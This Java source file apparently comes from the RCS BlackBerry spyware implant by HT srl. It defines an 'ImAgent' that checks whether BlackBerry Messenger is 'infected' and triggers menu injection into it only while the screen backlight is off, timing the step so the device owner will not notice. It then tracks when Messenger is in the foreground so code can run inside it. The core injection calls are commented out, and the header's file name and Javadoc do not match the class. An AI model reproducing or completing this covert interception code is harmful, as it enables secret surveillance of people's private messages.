//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry
 * Package      : blackberry.agent
 * File         : TaskAgent.java
 * Created      : 28-apr-2010
 * *************************************************/
package blackberry.agent;

import net.rim.device.api.system.Backlight;
import blackberry.AppListener;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.injection.AppInjector;
import blackberry.interfaces.ApplicationObserver;
import blackberry.interfaces.BacklightObserver;
import blackberry.utils.Utils;

// TODO: Auto-generated Javadoc
/**
 * PIM, calendario, appuntamenti.
 */
public final class ImAgent extends Agent implements BacklightObserver,
        ApplicationObserver {
    //#ifdef DEBUG
    static Debug debug = new Debug("ImAgent", DebugLevel.VERBOSE);
    //#endif

    AppInjector appInjector;
    static boolean forced = false;
    boolean infected;

    String appName = "Messenger";

    /**
     * Instantiates a new task agents
     * 
     * @param agentStatus
     *            the agent status
     */
    public ImAgent(final boolean agentEnabled) {
        super(Agent.AGENT_IM, agentEnabled || forced, true, "ImAgent");
    }

    /**
     * Instantiates a new task agent.
     * 
     * @param agentStatus
     *            the agent status
     * @param confParams
     *            the conf params
     */
    protected ImAgent(final boolean agentStatus, final byte[] confParams) {
        this(agentStatus);
        parse(confParams);

        setDelay(NEVER);
        setPeriod(NEVER);
    }

    public synchronized void actualStart() {
        //#ifdef DEBUG
        debug.trace("actualStart");
        //#endif

        AppListener.getInstance().addBacklightObserver(this);
        AppListener.getInstance().addApplicationObserver(this);

        try {
            appInjector = new AppInjector(AppInjector.APP_BBM);
            infected = appInjector.isInfected();
        } catch (Exception ex) {
            //#ifdef DEBUG
            debug.error("actualStart: " + ex);
            //#endif
        }

        if (!infected && !Backlight.isEnabled()) {
            //#ifdef DEBUG
            debug.trace("actualStart, infecting");
            //#endif
            menuInject();
        }
    }

    private void menuInject() {
        //#ifdef DEBUG
        debug.trace("menuInject");
        //#endif

        //appInjector.requestForeground();
        //appInjector.injectMenu();
        //appInjector.callMenu();
        //appInjector.deleteMenu();

        infected = true;
    }

    public synchronized void actualStop() {
        //#ifdef DEBUG
        debug.trace("actualStop");
        //#endif

        AppListener.getInstance().removeBacklightObserver(this);
        AppListener.getInstance().removeApplicationObserver(this);
    }

    public void actualRun() {
        if (infected && Backlight.isEnabled() && isAppForeground) {
            //#ifdef DEBUG
            debug.info("actualRun, infected, enabled, foreground");
            //#endif

            //appInjector.callInContext();
        }
    }

    /*
     * (non-Javadoc)
     * @see blackberry.agent.Agent#parse(byte[])
     */
    protected boolean parse(final byte[] confParameters) {
        //#ifdef DEBUG
        if (confParameters != null) {
            debug.trace("parse: " + Utils.byteArrayToHex(confParameters));
        } else {
            debug.trace("parse: null");
        }
        //#endif
        return false;
    }

    public void onBacklightChange(boolean status) {
        // TODO Auto-generated method stub

    }

    boolean isAppForeground;

    public void onApplicationChange(String startedName, String stoppedName,
            String startedMod, String stoppedMod) {
        if (startedName != null && startedName.indexOf(appName) >= 0) {
            //#ifdef DEBUG
            debug.trace("onApplicationChange: foreground");
            //#endif
            isAppForeground = true;
        } else {
            //#ifdef DEBUG
            debug.trace("onApplicationChange: not foreground");
            //#endif
            isAppForeground = false;
        }
    }



}
